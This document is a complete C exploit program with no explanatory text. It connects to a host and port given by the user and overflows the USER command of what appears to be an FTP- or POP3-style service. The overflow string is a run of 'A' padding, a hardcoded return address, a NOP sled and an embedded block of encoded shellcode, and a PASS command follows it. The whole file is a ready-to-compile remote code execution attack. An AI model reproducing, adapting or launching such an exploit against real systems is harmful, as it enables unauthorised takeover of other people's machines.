#include <stdio.h>

#include <netinet/in.h>

#include <sys/socket.h>

#include <sys/types.h>

#include <netdb.h>

int main(int argc, char **argv)

{

struct sockaddr_in addr;

struct hostent *host;

char buffer[1109];

char buffer2[16];
int s, i;

if(argc != 3)

{

fprintf(stderr, "usage: %s <host> <port>\n", argv[0]);

exit(0);

}

s = socket(AF_INET, SOCK_STREAM, 0);

if(s == -1)

{

perror("socket() failed\n");

exit(0);

}

host = gethostbyname(argv[1]);

if( host == NULL)

{

herror("gethostbyname() failed");

exit(0);

}

addr.sin_addr = *(struct in_addr*)host->h_addr;

addr.sin_family = AF_INET;

addr.sin_port = htons(atol(argv[2]));

 

if(connect(s, &addr, sizeof(addr)) == -1)

{

perror("couldn't connect so server\n");

exit(0);

}
char buffRead[2048];
recv(s, buffRead, 2048, 0);
printf("%s\n", buffRead);
char shellcode[] = "\xdb\xd1\xb8\x2c\xfb\x9f\xcf\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x49\x83\xc3\x04\x31\x43\x15\x03\x43\x15\xce\x0e\x63\x27\x87"
"\xf1\x9c\xb8\xf7\x78\x79\x89\x25\x1e\x09\xb8\xf9\x54\x5f\x31"
"\x72\x38\x74\xc2\xf6\x95\x7b\x63\xbc\xc3\xb2\x74\x71\xcc\x19"
"\xb6\x10\xb0\x63\xeb\xf2\x89\xab\xfe\xf3\xce\xd6\xf1\xa1\x87"
"\x9d\xa0\x55\xa3\xe0\x78\x54\x63\x6f\xc0\x2e\x06\xb0\xb5\x84"
"\x09\xe1\x66\x93\x42\x19\x0c\xfb\x72\x18\xc1\x18\x4e\x53\x6e"
"\xea\x24\x62\xa6\x23\xc4\x54\x86\xef\xfb\x58\x0b\xee\x3c\x5e"
"\xf4\x85\x36\x9c\x89\x9d\x8c\xde\x55\x28\x11\x78\x1d\x8a\xf1"
"\x78\xf2\x4c\x71\x76\xbf\x1b\xdd\x9b\x3e\xc8\x55\xa7\xcb\xef"
"\xb9\x21\x8f\xcb\x1d\x69\x4b\x72\x07\xd7\x3a\x8b\x57\xbf\xe3"
"\x29\x13\x52\xf7\x4b\x7e\x3b\x34\x61\x81\xbb\x52\xf2\xf2\x89"
"\xfd\xa8\x9c\xa1\x76\x76\x5a\xc5\xac\xce\xf4\x38\x4f\x2e\xdc"
"\xfe\x1b\x7e\x76\xd6\x23\x15\x86\xd7\xf1\xb9\xd6\x77\xaa\x79"
"\x87\x37\x1a\x11\xcd\xb7\x45\x01\xee\x1d\xee\xab\x14\xf6\xd1"
"\x83\x03\x6f\xba\xd1\x2b\x7e\x66\x5c\xcd\xea\x86\x08\x45\x83"
"\x3f\x11\x1d\x32\xbf\x8c\x5b\x74\x4b\x22\x9b\x3b\xbc\x4f\x8f"
"\xac\x4c\x1a\xed\x7b\x52\xb1\x98\x83\xc6\x3d\x0b\xd3\x7e\x3f"
"\x6a\x13\x21\xc0\x59\x2f\xe8\x54\x22\x58\x15\xb8\xa2\x98\x43"
"\xd2\xa2\xf0\x33\x86\xf0\xe5\x3b\x13\x65\xb6\xa9\x9b\xdc\x6a"
"\x79\xf3\xe2\x55\x4d\x5c\x1c\xb0\x4f\xa1\xcb\xfd\xd5\xd3\x79"
"\xee\x15";

buffer[0] = 'U';
buffer[1] = 'S';
buffer[2] = 'E';
buffer[3] = 'R';
buffer[4] = ' ';

for(i = 5; i < 490 ; i++)

buffer[i] = 'A';

buffer[490] = '\xD7';
buffer[491] = '\x30';
buffer[492] = '\x9D';
buffer[493] = '\x7C';
buffer[494] = 'C';
buffer[495] = 'C';
buffer[496] = 'C';
buffer[497] = 'C';
for (i = 498; i < 784; i++)

buffer[i] = '\x90';

for (i = 0; i < 317; i++)

buffer[i+784] = shellcode[i];

buffer[1101] = '\r';
buffer[1102] = '\n';
buffer[1103] = '\0';
printf("buffer is: %s\n", buffer);

send(s, buffer, strlen(buffer), 0);
recv(s, buffRead, 2048, 0);
printf("%s\n", buffRead);

buffer2[0] = 'P';
buffer2[1] = 'A';
buffer2[2] = 'S';
buffer2[3] = 'S';
buffer2[4] = ' ';
buffer2[5] = 'P';
buffer2[6] = 'A';
buffer2[7] = 'S';
buffer2[8] = 'S';
buffer2[9] = 'W';
buffer2[10] = 'O';
buffer2[11] = 'R';
buffer2[12] = 'D';
buffer2[13] = '\r';
buffer2[14] = '\n';
buffer2[15] = '\0';
send(s, buffer2, strlen(buffer2), 0);
recv(s, buffRead, 2048, 0);
printf("%s\n", buffRead);
close(s);

return 0;

}
